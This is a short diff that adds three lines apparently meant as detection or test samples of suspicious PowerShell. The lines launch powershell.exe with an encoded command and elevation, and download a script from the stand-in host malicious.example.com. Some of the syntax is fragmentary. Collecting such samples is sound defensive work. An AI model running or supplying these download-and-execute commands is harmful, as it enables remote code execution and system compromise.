@@ -1,0 +1,3 @@
+$"\x00\x00\x00" - typical suspicious encoded script execution example
+Start-Process -FilePath "powershell.exe" -ArgumentList "-encodedCommand SQBFAFg" -Verb RunAs
+New-Object System.Net.WebClient).DownloadString('http://malicious.example.com/script.ps1')
